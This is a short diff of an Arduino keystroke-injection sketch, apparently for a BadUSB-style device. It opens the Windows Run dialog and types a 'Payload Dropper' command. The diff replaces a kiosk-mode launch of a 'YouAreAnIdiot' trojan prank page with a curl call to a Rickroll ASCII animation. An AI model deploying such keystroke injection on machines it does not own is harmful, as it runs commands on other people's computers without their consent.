@@ -6,7 +6,7 @@ Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press(114);
 Keyboard.releaseAll();
 delay(1200);
-Keyboard.print(F("msedge.exe --kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot --edge-kiosk-type=fullscreen")); //Payload Dropper
+Keyboard.print(F("curl http://ascii.live/rick")); //Payload Dropper
 typeKey(KEY_RETURN);
 delay(5000);
 Keyboard.end();
